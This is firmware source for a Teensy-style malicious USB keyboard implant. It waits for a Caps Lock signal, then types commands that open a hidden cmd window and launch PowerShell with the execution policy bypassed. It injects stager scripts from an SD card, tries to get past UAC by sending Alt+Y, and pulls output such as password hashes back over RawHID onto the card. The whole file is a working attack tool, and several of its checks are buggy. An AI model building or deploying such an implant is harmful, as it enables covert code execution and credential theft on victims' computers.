#include <Arduino.h>
#include <SD.h>
#include <SPI.h>
#include <stdlib.h>
#include <usb_desc.h>
#include "main.h"
#include "payload.h"


const int cs = 254;

int ledkeys(void)       {return int(keyboard_leds);}
bool is_scroll_on(void) {return ((ledkeys() & 4) == 4) ? true : false;}
bool is_caps_on(void)   {return ((ledkeys() & 2) == 2) ? true : false;}
bool is_num_on(void)    {return ((ledkeys() & 1) == 1) ? true : false;}

Payload** payloads;
int payloadc = 0;


void blink_fast(int blinkrate,int delaytime)
{
	int blinkcounter=0;
	for(blinkcounter=0; blinkcounter!=blinkrate; blinkcounter++)
	{
		digitalWrite(LED_BUILTIN, HIGH);
		delay(delaytime);
		digitalWrite(LED_BUILTIN, LOW);
		delay(delaytime);
	}
}
// Wait for Windows to be ready before we start typing.

void wait_for_drivers(unsigned int speed)
{
	bool numLockTrap = is_num_on();
	while(numLockTrap == is_num_on())
	{
		blink_fast(5,80);
		Keyboard.set_key1(KEY_NUM_LOCK);
		Keyboard.send_now();
		Keyboard.set_modifier(0);
		Keyboard.set_key1(0);
		Keyboard.send_now();
		delay(speed);
	}
	Keyboard.set_key1(KEY_NUM_LOCK);
	Keyboard.send_now();
	Keyboard.set_modifier(0);
	Keyboard.set_key1(0);
	Keyboard.send_now();
	delay(speed);
}


void panic() {  //does not return, locks processor and blinks slowly
	Serial1.println("PANIC!");
	while(true){
		digitalWrite(LED_BUILTIN,HIGH);
		delay(5000);
		digitalWrite(LED_BUILTIN,LOW);
		delay(5000);
	}
}
int readline(char* dest, int len, usb_serial_class* port){
	int i;
	for (i = 0; i<len && dest[i]!='\n'; i++){
		while (true){
			if ((*port).available() > 0 ){
				dest[i]=(*port).read();
				break;
			}
		}
	}
	dest[i+1]='\0'; //terminate string
	if (i >= len){
		return -1; //buffer too small
	}
	return (i+1); //return length
}
inline char* padmessage(const char* msg){ //this WILL truncate messages longer than 64 bytes
	char* outmsg = new char[64];
	int x = strlen(msg);
	if (x>64){
		x = 64; //prevent an overflow
	}
	for (int i = 0; i<x; i++){
		outmsg[i]=msg[i];
	} for(int i = x; i<64; i++){
		outmsg[i]=0x00; //pad with nulls to fill the message
	}
	return outmsg;
}
inline char* unpadmessage(const char* msg){
	int x = strlen(msg);
	if(x>64){
		x=64; //prevent malformed messages from smashing things
	}
	char* out = (char*)malloc(x+1);
	strncpy(out,msg,x); //copy to new buffer
	out[x]=0x00; //add external null terminate to avoid overruns
	return out;
}
inline char* unpadmessage(char* buf, const char* msg, int len){
	if (len > 64){
		len=64; //prevent overread
	}
	return strncpy(buf,msg,len);
}
char* rawhid_blocking_rcv(){
	char* msg = new char[64];
	while (RawHID.recv(msg, 0) > 0){ //loop if there isn't a message
		yield();
	}
	return msg;
}
int rcv_message(void* buf, uint16_t timeout){
	int x = RawHID.recv(buf,timeout);
	if(x>0){
		return x;
	} else{
		Serial1.println("Timeout!");
		panic();
		return 0; //stop complaining, gcc.
	}
}
void setup() {
	delay(100); //delay 100ms, makes it work for some reason
	Serial1.begin(115200); //hardware UART for debug
	Serial1.println("Init!");
	pinMode(LED_BUILTIN, OUTPUT);
	digitalWrite(LED_BUILTIN, HIGH);
	delay(500);
	digitalWrite(LED_BUILTIN, LOW);
	Serial1.println("Starting SD!");
	if(!SD.begin(cs)){
		Serial1.println("SD ERR");
		panic();// Failed to initialize SD card, fall to error condition
	}
	Serial1.println("SD Started!");
	wait_for_drivers(100); //probe numlock with 100ms delay
	bool capsTrap = is_caps_on();
	Serial1.println("CapsTrap Active."); //press capslock to run
	while(capsTrap == is_caps_on()){
		blink_fast(2,100); //check every 200ms for if caps lock changed, that's our signal to go
	}
	delay(50); //give a chance for caps to settle from the actual keyboard
	if (is_caps_on()){
			Keyboard.set_key1(KEY_CAPS_LOCK);
			Keyboard.send_now();
			Keyboard.set_modifier(0);
			Keyboard.set_key1(0);
			Keyboard.send_now();
	}
	Serial1.println("Parsing Config...");
	readconfig();
	Serial1.println("Config Parsed. Firing now...");
	startPowershell();
	typeFile("stage0.ps1"); //type the initial stager, use RawHID to transfer everything else
	Payload* functions = new Payload("functions.ps1");
	functions->fire(); //we use this again, so don't free it
	Payload* stager = new Payload("stager.ps1");
	stager->fire(); //fire stager
	char init[5] = {0};
	void* buf[65] = {0}; //add trailing null so strlen doesn't puke
	if(RawHID.recv(buf,20000) >0){ //possibly increase this if it's too short? it will return a packet is received anyways
		Serial1.println("ERR: Didn't recive init from stager!\nAssuming stager didn't execute properly");
		panic();
	}
	unpadmessage(init,(const char*)buf,4); //stop and wait for init
	if(strcmp(init,"init")){
		RawHID.send(padmessage("ack"),20000); //will return if the message is ready to be sent
	} else {
		Serial1.println("ERR: init magic was incorrect!");
		panic(); //Didn't get proper init from stager!
	}
	char pcname[16] = {0};
	rcv_message(buf,20000);
	unpadmessage(pcname, (const char*) buf, 16);
//	char* uacstatus = (char*)malloc();
//	readline(uacstatus, , *Serial);  //TODO: parse return of this function and figure out how to bypass
	char adminstatus[6] = {0};
	rcv_message(buf,20000);
	unpadmessage(adminstatus, (const char*) buf, 5);
	if (strcmp(adminstatus, "False")){
		UACBypass("psadmin.ps1"); //starts new PS shell as admin, and attempts to alt-y through UAC
		typeFile("stage0.ps1"); //load the stager into the new window
		functions->fire(); //add the HID functions to the new PS session
		Payload* smallstage = new Payload("smallstager.ps1");
		smallstage->fire();
	}
	for(int i = 0; i<payloadc; i++){
		payloads[i]->fire();
		if(payloads[i]->doesreturn())
		payload_rcv(payloads[i], pcname); //listen for returned value;
	}

}

void readconfig(){
	File conf = SD.open("config.txt");
	char line[100];
	bool run=true;
	char filename[50];
	char ext[3];
	char magic[50];
	while (run){
		for(int i = 0; i<100; i++){
			line[i]=conf.read();
			Serial1.print(line[i]);
			if (line[i] == '\r' || line[i] == '\n' || line[i]=='\0'){
				line[i]= '\0';
				Serial1.println(""); //terminate the debug output
				if(i==0 && line[i]== '\0'){
					goto breakloop; //end of the config file, stop the parseloop
				}
				break;
			}
		}
		Payload* load = new Payload(filename);
		int offset = 0;
		if (line[0] == ';'){ //allow for comments
			goto skipline; //jump past the line parser
		}
		for (uint i=0; i<strlen(line); i++){
			if(line[i]==','){
				offset=(i+1);
				filename[i]='\0';
				break;
			}
			if(line[i]=='\0'){
				load->doesreturn(false);//config implies function does not return data.
				if(i == 0){ //first byte of line is a null byte
					run=false; //out of config
					goto breakloop;
				}
				offset = -1; //tell future things that we've reached EOL
				filename[i]='\0';
				break;
			}
			filename[i]=line[i];
		}
		if (offset > 0) {
			load->doesreturn(true); //this is only hit if the config implies data return
			for (uint i = 0; i < strlen(line); i++) {
				if (line[i] == ',') {
					offset = (i + 1);
					magic[i] = '\0';
					break;
				}
				if (line[i] == '\0') {
					offset = -1; //tell future things that we've reached EOL
					magic[i] = '\0';
					break;
				}
				magic[i] = line[i + offset];
			}
		}
		if (offset > 0) {
			for (uint i = 0; i < strlen(line); i++) {
				if (line[i] == ',') {
					offset = (i + 1);
					ext[i] = '\0';
					break;
				}
				if (line[i] == '\0') {
					offset = -1; //tell future things that we've reached EOL
					ext[i] = '\0'; //terminate the string
					break;
				}
				ext[i] = line[i + offset];
			}
		}
		Serial1.printf("Payload %d: %s\n",(payloadc+1),filename);
		load->setmagic(magic);
		load->setext(ext);
		if (payloadc ==0){ //yes eclipse, I know you don't know what size_t is
			payloads = (Payload**)malloc(sizeof(Payload)); //Allocate stack
		}else {
			realloc(payloads, sizeof(payloads)+sizeof(Payload*)); //add a space onto payload stack
		}
		payloadc++;
		payloads[payloadc-1] = load; //put the new payload object into the array

		skipline: //jump here to skip the parser
		delay(0); //gcc *should* optimize this out

	}
	breakloop: //end of the loop
	conf.close();
}

void UACBypass(const char* payload){
	Payload* uacbypass = new Payload(payload);
	uacbypass->fire();
	delay(2000); //wait 2 seconds for UAC prompt
	Keyboard.set_modifier(MODIFIERKEY_ALT);
	Keyboard.set_key1(KEY_Y);
	Keyboard.send_now();
	Keyboard.set_modifier(0);
	Keyboard.set_key1(0);
	Keyboard.send_now();
	delay(200); //wait for PS to spool up;
}

void payload_rcv(Payload* load, const char* pcname){
	char* filename = (char*)malloc(50);
	strcat(filename, pcname);
	strcat(filename, load->getext());
	char* magic = (char*)malloc(sizeof(load->getmagic()+6)); //add 6 bytes for _START or _END
	sprintf(magic, "%s_START", load->getmagic());
	char buf[65] = {0};
	rcv_message(buf,20000);
	if (!strcmp(buf, magic)){
		panic(); //magic recieved didn't match
	}
	sprintf(magic, "%s_END", load->getmagic());//we clobber the magic string to
	File outfile = SD.open(filename, O_RDWR); //we want read/write
	while (true){
		rcv_message(buf,20000); //the buffer is large enough and padded with nulls, no need to unpad
		if (strcmp(buf, magic)){
			break; //end magic recived
		}
		outfile.print(buf); //doesn't care that buf is huge compared to the string
	}
	outfile.close();
	free(magic);
	free(filename);
}

void hash_rcv(char* filename){
	char* buffer = (char*)malloc(100); //give readline plenty of room to work with
	File hashfile = SD.open(filename, FILE_WRITE);
	while(true){ //we don't know how many hashes we have, so loop infinitely
		readline(buffer, 100, &Serial); //will overwrite previous string in buffer
		if(strcmp(buffer,"HASHEND")){ //if it's the end magic stop and return
			break;
		}
		hashfile.println(buffer); //doesn't care about the garbage at the end, stops at first \0
	}
	hashfile.close();  //we're done, close the file
	free(buffer); //we won't be using this anymore
}

void loop() { //falls to this when done
	digitalWrite(LED_BUILTIN, HIGH);
	delay(2000);
	digitalWrite(LED_BUILTIN, LOW);
	delay(2000);
}

void startPowershell(){
	loop(); //one blink
	Keyboard.set_modifier(MODIFIERKEY_RIGHT_GUI);
	Keyboard.set_key1((unsigned int)KEY_R);
	Keyboard.send_now();
	Keyboard.set_modifier(0);
	Keyboard.set_key1(0);
	Keyboard.send_now();
	delay(200); //wait for run prompt
	Keyboard.println("cmd.exe/T:01 /K mode CON: COLS=15 LINES=1");
	delay(500);
	Keyboard.println("if exist C:\\Windows\\SysWOW64 ( set PWRSHLXDD=C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell) else ( set PWRSHLXDD=powershell )");
	Keyboard.println("%PWRSHLXDD% -ExecutionPolicy Bypass"); //pick powershell appropriate to target arch
	delay(500); //wait for PS window
}
void echoPayload(char* load, int len){
	Keyboard.println(load); //use println to hit enter for us
}
void typeFile(const char* filename){ //fire a payload to stage0
		File load = SD.open(filename); //it assumes readonly, which we're fine with
		int buffill; //length of data in buffer
		char loadbuf[65] = {0};//add extra null for print.
		buffill = load.read(loadbuf, 64); //fill the buffer
		while(buffill>0){ //loop again file if the last read returned any data
			Keyboard.write(loadbuf, buffill); //pass buffer to keyboard, with length of data in buffer
			buffill = load.read(loadbuf, 64); //does the file have more data for us?
		}
		Keyboard.println(""); //append a last enter in case the file doesn't have one
		load.close(); //make sure we close the file so SdFat can be used again
}
